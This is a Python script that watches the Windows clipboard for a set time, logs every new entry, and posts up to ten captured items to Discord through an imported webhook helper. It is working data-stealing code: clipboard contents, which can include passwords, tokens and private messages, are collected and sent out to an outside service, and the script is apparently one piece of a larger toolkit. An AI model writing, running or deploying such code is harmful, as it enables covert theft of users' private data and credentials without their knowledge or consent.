#!/usr/bin/env python3
"""
Clipboard Monitor
Monitors clipboard for changes and logs content
"""

import sys
import os
import time
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def get_clipboard_content():
    """Get current clipboard content (Windows)"""
    try:
        import win32clipboard
        
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
            return data
        except:
            return None
        finally:
            win32clipboard.CloseClipboard()
            
    except ImportError:
        # Fallback using tkinter
        try:
            import tkinter as tk
            root = tk.Tk()
            root.withdraw()
            content = root.clipboard_get()
            root.destroy()
            return content
        except:
            return None
    except Exception as e:
        return None

def monitor_clipboard(duration=30, check_interval=1):
    """
    Monitor clipboard for changes
    
    Args:
        duration: How long to monitor (seconds)
        check_interval: How often to check (seconds)
    """
    print("=" * 60)
    print("CLIPBOARD MONITOR")
    print("=" * 60)
    print(f"\nMonitoring clipboard for {duration} seconds...")
    print("Copy something to test!\n")
    
    last_content = ""
    captured_items = []
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            current_content = get_clipboard_content()
            
            if current_content and current_content != last_content:
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                # Truncate long content for display
                display_content = current_content[:100]
                if len(current_content) > 100:
                    display_content += "..."
                
                print(f"[{timestamp}] Clipboard changed:")
                print(f"  {display_content}\n")
                
                captured_items.append({
                    'timestamp': timestamp,
                    'content': current_content[:500],  # Limit size
                    'length': len(current_content)
                })
                
                last_content = current_content
            
            time.sleep(check_interval)
    
    except KeyboardInterrupt:
        print("\n\nMonitoring stopped by user.")
    
    # Summary
    print("=" * 60)
    print(f"MONITORING COMPLETE")
    print(f"Captured {len(captured_items)} clipboard changes")
    print("=" * 60)
    
    # Send to Discord
    if captured_items and WEBHOOK_AVAILABLE:
        print("\nSending clipboard data to Discord...")
        
        message = f"**Captured {len(captured_items)} clipboard items**\n\n"
        
        for i, item in enumerate(captured_items[:10], 1):
            message += f"**[{item['timestamp']}]** ({item['length']} chars)\n"
            message += f"```\n{item['content'][:200]}\n```\n"
        
        if len(captured_items) > 10:
            message += f"\n... and {len(captured_items) - 10} more items"
        
        success = send_to_discord("Clipboard Data Captured", message)
        
        if success:
            print("✓ Data sent to Discord")
        else:
            print("✗ Failed to send to Discord")

if __name__ == "__main__":
    # Default: monitor for 30 seconds
    duration = 30
    
    if len(sys.argv) > 1:
        try:
            duration = int(sys.argv[1])
        except ValueError:
            print("Usage: python clipboard_monitor.py [duration_in_seconds]")
            sys.exit(1)
    
    monitor_clipboard(duration)
